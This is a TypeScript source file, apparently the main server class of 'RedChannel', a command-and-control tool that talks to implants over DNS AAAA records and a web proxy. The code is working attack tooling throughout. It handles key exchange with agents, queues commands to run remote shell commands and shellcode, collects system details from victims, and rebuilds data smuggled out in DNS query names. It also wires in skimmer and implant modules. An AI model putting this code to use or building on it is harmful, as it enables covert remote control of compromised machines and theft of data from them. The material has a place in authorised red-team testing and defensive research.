import * as crypto from "crypto";
import * as path from "path";
import ECKey from "ec-key";

import { Config, Constants, emsg, padTail, padZero } from "../utils/utils";
import Crypto, { CipherModel, KeyExportType } from "./crypto";
import Logger from "./logger";
import SkimmerModule, { SkimmerModuleConfig as SkimmerModuleConfig } from "../modules/skimmer";
import StaticDnsModule, { StaticDnsModuleConfig } from "../modules/static_dns";
import ImplantModule, { ImplantModuleConfig as ImplantModuleConfig } from "../modules/implant";
import AgentModule, { AgentModuleConfig } from "../modules/agent";
import ProxyModule, { ProxyModuleConfig as ProxyModuleConfig } from "../modules/proxy";
import C2Module, { C2ModuleConfig } from "../modules/c2";

import { implant } from "../pb/implant";

/*
req: {
    connection: {
        remoteAddress: '127.0.0.1',
        type: 'AAAA'
    }
}
res: {
    question[0]: {
        type: 'AAAA',
        name: 'dns.query.tld'
    },
    answer: [],
    end: function(){}
}
*/
export enum C2AnswerType {
    TYPE_A = "A",
    TYPE_AAAA = "AAAA",
    TYPE_PROXY = "PROXY",
}
export type C2Answer = {
    name: string;
    type: C2AnswerType;
    data: string;
    ttl: number;
};
export type C2RequestConnection = {
    remoteAddress: string;
    type: C2AnswerType;
};
export type C2ResponseQuestion = {
    name: string;
    type: C2AnswerType;
};
export type C2MessageRequest = {
    connection: C2RequestConnection;
};
export type C2MessageResponse = {
    question: C2ResponseQuestion[];
    answer: C2Answer[];
    end: Function;
};

// to clarify the Map()s
export type DataId = string;
export type DataChunk = string;
export type SendQEntry = string[];
export type AgentId = string;
export type AgentIdRandId = string;

export type AgentModel = {
    id: string;
    secret: Buffer;
    keyx?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: AgentChannel;
    allowKeyx?: boolean;
    sendq: SendQEntry[];
    // each agent command has a map of dataId => chunks[]
    recvq: Map<implant.AgentCommand, Map<DataId, DataChunk[]>>;
};

export enum AgentChannel {
    UNKNOWN = "unknown",
    DNS = "dns",
    PROXY = "proxy",
}

export type Modules = {
    c2: C2Module;
    agent: AgentModule;
    skimmer: SkimmerModule;
    static_dns: StaticDnsModule;
    proxy: ProxyModule;
    implant: ImplantModule;
};
// the config values for each module are made optional
// as we don't need to define all of these for the config
// to _merge in BaseModule
export type ModulesConfig = {
    c2: Partial<C2ModuleConfig>;
    agent: Partial<AgentModuleConfig>;
    skimmer: Partial<SkimmerModuleConfig>;
    static_dns: Partial<StaticDnsModuleConfig>;
    proxy: Partial<ProxyModuleConfig>;
    implant: Partial<ImplantModuleConfig>;
};

export default class RedChannel {
    version = Constants.VERSION;

    agents: Map<AgentId, AgentModel>;
    flood: Map<AgentIdRandId, NodeJS.Timeout>;

    // module instances
    modules: Modules;

    hashedPassword: string;
    plaintextPassword: string;

    configFile: string;

    // the absolute path to the app directory
    appRoot: string = path.resolve("./");

    log: Logger;

    crypto: Crypto;

    constructor(c2Password: string, cliConfig: ModulesConfig, configFile: string) {
        this.log = new Logger();

        this.agents = new Map<AgentId, AgentModel>();

        this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;

        this.modules = {
            c2: new C2Module(this, cliConfig.c2),
            proxy: new ProxyModule(
                this,
                cliConfig.proxy,
                (result) => {
                    this.log.debug(result.message);
                },
                (error) => {
                    this.log.error(error.message);
                }
            ),
            implant: new ImplantModule(this, cliConfig.implant),
            static_dns: new StaticDnsModule(this, cliConfig.static_dns),
            skimmer: new SkimmerModule(this, cliConfig.skimmer),
            agent: new AgentModule(this, cliConfig.agent),
        };

        if (!this.modules.c2.config.domain) {
            throw new Error("Please specify the c2 domain via cli or config file, see '--help'");
        }

        this.plaintextPassword = c2Password;
        this.hashedPassword = crypto.createHash("md5").update(c2Password).digest("hex");

        this.appRoot = __dirname;

        this.crypto = new Crypto();

        this.flood = new Map<AgentId, NodeJS.Timeout>();
    }

    initAgent(agentId: string, channel: AgentChannel, ip?: string) {
        if (!this.agents.has(agentId)) {
            this.agents.set(agentId, {
                id: agentId,
                secret: Buffer.from(""),
                lastseen: Date.now() / 1000,
                ip: ip,
                channel: channel,
                allowKeyx: false,
                sendq: [],
                recvq: new Map<implant.AgentCommand, Map<DataId, DataChunk[]>>(),
            });
        }
    }

    killAgent(agentId: string) {
        this.agents.delete(agentId);
    }

    broadcastKeyx() {
        this.sendCommandKeyx();
    }

    /**
     * Send keyx to an agent, broadcast it to all
     * @param agentId if null, we will broadcast keyx to all agents
     * @returns
     */
    sendCommandKeyx(agentId?: string) {
        if (!this.crypto.privateKey) {
            try {
                this.crypto.generateKeys();
            } catch (ex) {
                this.log.error(`failed to generate keys: ${emsg(ex)}`);
                return;
            }
        }

        const uncompressedPublicKey = this.crypto.exportPublicKey(KeyExportType.UNCOMPRESSED);
        if (!agentId) {
            // broadcast keyx if no agent is specified
            for (const id of this.agents.keys()) {
                this.queueData(id, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey).catch((ex) => {
                    this.log.error(`error queueing data for agent ${id}: ${emsg(ex)}`);
                });
            }
            this.log.info("broadcasting keyx");
            return;
        }

        this.queueData(agentId, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey)
            .then(() => {
                this.log.warn(`keyx started with agent ${agentId}`);
            })
            .catch((ex) => {
                this.log.error(`error queueing data for agent ${agentId}: ${emsg(ex)}`);
            });
        return;
    }

    sendCommandShutdown(agentId: string) {
        const secret = this.getAgent(agentId)?.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);

        this.queueData(agentId, implant.AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
            this.log.error(`error queueing data: ${emsg(ex)}`);
        });
    }

    sendCommandShell(agentId: string, shellCommand: string) {
        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
            this.log.error(`error queueing data: ${emsg(ex)}`);
        });
    }

    sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE_SHELLCODE, shellcode).catch((ex) => {
            this.log.error(`error queueing data: ${emsg(ex)}`);
        });
    }

    sendConfigChanges(agentId: string) {
        const configProto = implant.AgentConfig.create({});
        if (this.modules.agent.config.interval !== undefined) configProto.c2IntervalMs = { value: this.modules.agent.config.interval };
        if (this.modules.agent.config.throttle_sendq !== undefined) configProto.throttleSendq = { value: this.modules.agent.config.throttle_sendq };
        if (this.modules.agent.config.proxy_enabled !== undefined) configProto.useWebChannel = { value: this.modules.agent.config.proxy_enabled };
        if (this.modules.agent.config.proxy_key !== undefined) configProto.webKey = { value: this.modules.agent.config.proxy_key };
        if (this.modules.agent.config.proxy_url !== undefined) configProto.webUrl = { value: this.modules.agent.config.proxy_url };

        const configProtoBuffer = Buffer.from(implant.AgentConfig.encode(configProto).finish());
        // no need to send data, just the config proto
        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, configProtoBuffer).catch((ex) => {
            this.log.error(`error queueing data: ${emsg(ex)}`);
        });
    }

    // agent must be able to decrypt the tag to execute shutdown
    sendCommandSysinfo(agentId: string) {
        const secret = this.getAgent(agentId)?.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);

        this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
            this.log.error(`error queueing data: ${emsg(ex)}`);
        });
    }

    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer) {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);

        const commandProto = implant.Command.Request.create({
            command: command,
            data: data,
        });

        let commandProtoBuffer = Buffer.from(implant.Command.Request.encode(commandProto).finish());

        // keyx commands are not encrypted
        if (command !== implant.AgentCommand.AGENT_KEYX) {
            commandProtoBuffer = this.encryptPayload(commandProtoBuffer, agent.secret);
        }

        const dataBlocks = commandProtoBuffer.toString("hex").match(/[a-f0-9]{1,4}/g);
        if (!dataBlocks) throw new Error("invalid encrypted payload");

        // prettier-ignore
        const totalIps =
            Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
            Math.min(1, dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP);

        // prettier-ignore
        const totalCommands =
            Math.floor(totalIps / Config.MAX_IPS_PER_COMMAND) +
            Math.min(1, totalIps % Config.MAX_IPS_PER_COMMAND);

        const dataId = crypto.randomBytes(2).toString("hex");

        let ips: string[] = [];
        let paddedBytes = 0;
        for (let ipNum = 0; ipNum < totalIps; ipNum++) {
            const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);

            // pad the last block with trailing Fs
            const lastAddedBlock = blocksPerIp.slice(-1)[0];
            paddedBytes = 4 - lastAddedBlock.length;
            blocksPerIp[blocksPerIp.length - 1] = padTail(lastAddedBlock, 4);
            if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
                const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                for (let j = 0; j < blocksNeeded; j++) {
                    blocksPerIp.push(Config.DATA_PAD_CHAR.repeat(4));
                    paddedBytes += 4;
                }
            }
            if (paddedBytes > 0) {
                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
            }

            // prettier-ignore
            ips.push(
                Config.IP_DATA_PREFIX +
                ':' +
                padZero(ipNum.toString(16), 4) +
                ':' +
                blocksPerIp.join(':')
            );

            // add the header record to the top of the array
            if (totalCommands > 1 && (ips.length === Config.MAX_IPS_PER_COMMAND - 1 || ipNum === totalIps - 1)) {
                // prettier-ignore
                ips.unshift(
                    Config.IP_HEADER_PREFIX +
                    ':' +
                    dataId +
                    ':' +
                    padZero(command.toString(16), 2) +
                    padZero(paddedBytes.toString(16), 2) +
                    ':' +
                    padZero(totalIps.toString(16), 4) +
                    ':' +
                    '0000:0000:0000:0001'
                );

                agent.sendq.push(ips);
                ips = [];
            }
        }
        if (totalCommands === 1) {
            // prettier-ignore
            ips.unshift(
                Config.IP_HEADER_PREFIX +
                ':' +
                dataId +
                ':' +
                padZero(command.toString(16), 2) +
                padZero(paddedBytes.toString(16), 2) +
                ':' +
                padZero(totalIps.toString(16), 4) +
                ':' +
                '0000:0000:0000:0001'
            );
        }

        // set to false after keyx is received and there are no more keyx in sendq
        if (command === implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;

        if (ips.length > 0) {
            agent.sendq?.push(ips);
            if (this.modules.proxy.config.enabled && agent.channel === AgentChannel.PROXY) {
                await this.modules.proxy.sendToProxy(agent.id, ips);

                // cleanup sendq if proxying to agent
                agent.sendq = [];
            }
        }
        this.log.debug(`queued up ${totalIps} records in ${totalCommands} command(s) for agent: ${agentId}`);
        this.log.debug(`records: ${JSON.stringify(ips, null, 2)}`);
    }

    isCommandInSendQ(agentId: string, command: implant.AgentCommand) {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return;
        }

        const findCommand = padZero(command.toString(16), 2);
        let is = false;
        agent.sendq?.forEach((queue) => {
            if (queue[0].substring(0, 4) === Config.IP_HEADER_PREFIX) {
                if (queue[0].substring(12, 14) === findCommand) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    makeIpString(status: implant.C2ResponseStatus) {
        const lastByte = padZero(status.toString(16), 2);
        return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.AGENT_IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
    }

    /**
     * Make a string the cipher data and iv
     * @param {CipherModel} cipher A cipher object with IV and Data
     * @returns a hex string
     */
    makeEncryptedBufferStringHex(cipher: CipherModel) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    countDataChunks(chunks_array: string[]) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    getAllAgents() {
        return this.agents.keys();
    }

    getAgent(agentId: string): AgentModel | null {
        return this.agents.get(agentId) || null;
    }

    c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
        const question = res.question[0];
        const hostname = question.name;
        const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;

        const staticDnsHostnameIp = this.modules.static_dns.config.get(hostname);
        if (staticDnsHostnameIp) {
            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
            res.answer.push({
                name: hostname,
                type: C2AnswerType.TYPE_A,
                data: staticDnsHostnameIp,
                ttl: Config.C2_ANSWER_TTL_SECS,
            });
            return res.end();
        }

        if (!hostname.endsWith(this.modules.c2.config.domain)) {
            this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
            return res.end();
        }
        this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);

        if (question.type !== "AAAA" && question.type !== "PROXY") {
            // this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
            return res.end();
        }

        const segments = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
        if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
            this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
            return res.end();
        }

        // used to prevent flooding
        const antiCacheValue: string = segments[0];
        const agentId: string = segments[1];

        if (!this.agents.has(agentId)) {
            this.initAgent(agentId, channel, req.connection.remoteAddress);
            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
            try {
                this.sendCommandKeyx(agentId);
            } catch (ex) {
                this.log.error(`error sending keyx: ${emsg(ex)}`);
            }
            // upon first ping, we don't have any keyx so we will not try to decrypt any data
            // grab the next in queue (which should be the keyx) and respond with it.
            let answers: C2Answer[] | void;
            try {
                answers = this.getNextQueuedCommand(agentId, hostname);
            } catch (ex) {
                this.log.error(`error getting next queued command for first keyx: ${emsg(ex)}`);
            }
            if (answers) {
                res.answer = res.answer.concat(answers);
            }
            return res.end();
        }
        const agent = this.agents.get(agentId)!;

        agent.lastseen = Date.now() / 1000;
        agent.ip = req.connection.remoteAddress;

        let command = 0;
        try {
            command = parseInt(segments[2].slice(0, 2), 16);
        } catch (ex) {
            this.log.error(`failed to parse command byte: ${emsg(ex)}`);
            return res.end();
        }

        if (!Object.values(implant.AgentCommand).includes(command)) {
            this.log.warn(`unknown command from ${agentId}: ${command}, ignoring...`);
            return res.end();
        }

        const floodId = agentId + antiCacheValue;
        if (this.isAgentFlooding(floodId)) {
            // we have already responded to this agent and antiCacheValue combination
            this.log.warn(`ignoring flood from agent: ${agentId}, antiCache: ${antiCacheValue}, command: ${command}`);
            return res.end();
        }

        let chunkNumber = 0;
        let totalChunks = 0;
        try {
            chunkNumber = parseInt(segments[2].slice(2, 4), 16);
            totalChunks = parseInt(segments[2].slice(4, 6), 16);
        } catch (ex) {
            this.log.error(`error parsing chunk number and total chunks, current: ${chunkNumber}, total: ${totalChunks}: ${emsg(ex)}`);
            return res.end();
        }

        if (chunkNumber > totalChunks - 1) {
            this.log.error(`invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
            return res.end();
        }

        const dataId: string = segments[3];
        if (dataId.length < 2) {
            this.log.error(`invalid data id: ${dataId}`);
            return res.end();
        }

        const chunk: string = segments[4];
        if (chunk.length < 2) {
            this.log.error(`invalid chunk: ${chunk}`);
            return res.end();
        }

        if (!agent.recvq.has(command)) {
            agent.recvq.set(command, new Map<DataId, DataChunk[]>());
        }

        // we use ! to tell typescript we are smarter than it
        const recvqCommand = agent.recvq.get(command)!;
        if (!recvqCommand.get(dataId)) {
            recvqCommand.set(dataId, new Array(totalChunks));
        }

        const recvqDataId = recvqCommand.get(dataId)!;

        recvqDataId[chunkNumber] = chunk;

        // count all data array entries, excluding undefined
        // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
        if (this.countDataChunks(recvqDataId) === totalChunks) {
            const dataChunks = recvqDataId.join("");

            // process data, return answer records to send back
            res.answer = res.answer.concat(this.processAgentData(agentId, hostname, command, dataChunks));
            return res.end();
        }

        // we don't have all the chunks yet
        res.answer.push({
            name: hostname,
            type: C2AnswerType.TYPE_AAAA,
            data: this.makeIpString(implant.C2ResponseStatus.NEED_MORE_DATA),
            ttl: Config.C2_ANSWER_TTL_SECS,
        });

        /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
        }
        if (question.type == 'A') {
            res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
        }*/
        return res.end();
    }

    isAgentFlooding(floodId: string): boolean {
        if (this.flood.has(floodId)) {
            clearTimeout(this.flood.get(floodId));
            this.flood.set(
                floodId,
                setTimeout(() => {
                    this.flood.delete(floodId);
                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
            );
            return true;
        }

        // flood protection, if the agent dns resolver retries a query, data can be lost
        // so we ignore retries
        this.flood.set(
            floodId,
            setTimeout(() => {
                this.flood.delete(floodId);
            }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
        );
        return false;
    }

    checkInAgent(agent: AgentModel, hostname: string, checkInPayload: string): C2Answer[] | void {
        const agentId = agent.id;

        let agentData = "";
        try {
            const agentCommandResponseProto = this.decryptAgentData(agentId, checkInPayload);
            if (agentCommandResponseProto) agentData = Buffer.from(agentCommandResponseProto.data).toString();
        } catch (ex) {
            throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
        }
        if (!agentData) {
            throw new Error(`checkin payload is invalid for ${agentId}`);
        }

        if (agent.sendq?.length === 0) {
            this.log.debug(`agent ${agentId} checking in, no data to send`);
            return [
                {
                    name: hostname,
                    type: C2AnswerType.TYPE_AAAA,
                    data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
                    ttl: Config.C2_ANSWER_TTL_SECS,
                },
            ];
        }

        this.log.debug(`agent ${agentId} checking in, sending next queued command`);
        const answers = this.getNextQueuedCommand(agentId, hostname);
        return answers;
    }

    getNextQueuedCommand(agentId: string, hostname: string): C2Answer[] | void {
        const agent = this.agents.get(agentId);
        if (!agent) {
            throw new Error(`agent ${agentId} not found`);
        }

        const sendQItems = agent.sendq.shift() as SendQEntry;
        if (!sendQItems) return [];

        const answers: C2Answer[] = sendQItems.map((data) => ({
            name: hostname,
            type: C2AnswerType.TYPE_AAAA,
            data: data,
            ttl: Config.C2_ANSWER_TTL_SECS,
        }));
        return answers;
    }

    processAgentData(agentId: string, hostname: string, command: implant.AgentCommand, data: string): C2Answer[] {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return [
                {
                    name: hostname,
                    type: C2AnswerType.TYPE_AAAA,
                    data: this.makeIpString(implant.C2ResponseStatus.ERROR_AGENT_UNKNOWN),
                    ttl: Config.C2_ANSWER_TTL_SECS,
                },
            ];
        }

        switch (command) {
            // checkin should be authenticated (decrypt dummy data) or rogue agents can drain the queue for legitimate ones
            case implant.AgentCommand.AGENT_CHECKIN: {
                let checkInAnswers: C2Answer[] | void = [];
                try {
                    checkInAnswers = this.checkInAgent(agent, hostname, data);
                } catch (ex) {
                    this.log.error(emsg(ex));
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_CHECKING_IN),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                if (checkInAnswers) return checkInAnswers;
                return [
                    {
                        name: hostname,
                        type: C2AnswerType.TYPE_AAAA,
                        data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
                        ttl: Config.C2_ANSWER_TTL_SECS,
                    },
                ];
                break;
            }
            case implant.AgentCommand.AGENT_KEYX: {
                if (!agent.allowKeyx) {
                    this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_KEYX_NOT_ALLOWED),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }

                if (!this.crypto.privateKey) {
                    try {
                        this.crypto.generateKeys();
                    } catch (ex) {
                        this.log.error(`${emsg(ex)}`);
                        return [
                            {
                                name: hostname,
                                type: C2AnswerType.TYPE_AAAA,
                                data: this.makeIpString(implant.C2ResponseStatus.ERROR_GENERATING_KEYS),
                                ttl: Config.C2_ANSWER_TTL_SECS,
                            },
                        ];
                    }
                }

                try {
                    const agentPubkey = Buffer.from(data, "hex");
                    agent.keyx = this.crypto.importUncompressedPublicKey(agentPubkey);
                } catch (ex) {
                    this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_IMPORTING_KEY),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);

                try {
                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
                } catch (ex) {
                    this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DERIVING_SECRET),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);

                // if there are no more queued up keyx's, ignore further keyxs from agent
                if (!this.isCommandInSendQ(agentId, implant.AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
                break;
            }
            case implant.AgentCommand.AGENT_MESSAGE: {
                let agentMessage = "";
                try {
                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
                    if (agentCommandResponseProto) agentMessage = Buffer.from(agentCommandResponseProto.data).toString();
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.success(`agent(${agentId}) output>\n ${agentMessage}`);
                break;
            }
            case implant.AgentCommand.AGENT_SYSINFO: {
                let sysInfo: implant.SysInfoData = implant.SysInfoData.create({});
                try {
                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
                    if (agentCommandResponseProto && agentCommandResponseProto.data) {
                        sysInfo = implant.SysInfoData.decode(agentCommandResponseProto.data);
                    }
                } catch (ex) {
                    this.log.error(`cannot decrypt sysinfo from ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }

                if (!sysInfo.hostname) {
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_SYSINFO),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }

                const displayRows = [
                    ["hostname", sysInfo.hostname],
                    ["ips", sysInfo.ip.join(",")],
                    ["user", sysInfo.user],
                    ["uid", sysInfo.uid],
                    ["gid", sysInfo.gid],
                ];

                this.log.success(`agent(${agentId}) sysinfo>`);
                this.log.displayTable([], displayRows);
                break;
            }
        }
        return [
            {
                name: hostname,
                type: C2AnswerType.TYPE_AAAA,
                data: this.makeIpString(implant.C2ResponseStatus.DATA_RECEIVED),
                ttl: Config.C2_ANSWER_TTL_SECS,
            },
        ];
    }

    encryptPayload(data: Buffer, secret: Buffer): Buffer {
        const buffer = Buffer.from(data);
        const cipher = this.crypto.aesEncrypt(buffer, secret);
        return Buffer.concat([cipher.iv, cipher.data]);
    }

    decryptAgentData(agentId: string, data: string): implant.Command.Response | void {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);
        if (!data) throw new Error("invalid data");
        if (!agent.keyx) throw new Error("missing keyx");
        if (!agent.secret || agent.secret.length === 0) throw new Error("missing agent secret, do you need to 'keyx'?");

        const dataBuffer = Buffer.from(data, "hex");
        const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
        const ciphertext = dataBuffer.slice(this.crypto.BLOCK_LENGTH);

        // may throw errors
        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);

        try {
            const commandProto = implant.Command.Response.decode(plaintext);
            return commandProto;
        } catch (ex) {
            throw new Error(`failed to decode proto: ${emsg(ex)}`);
        }
    }
}
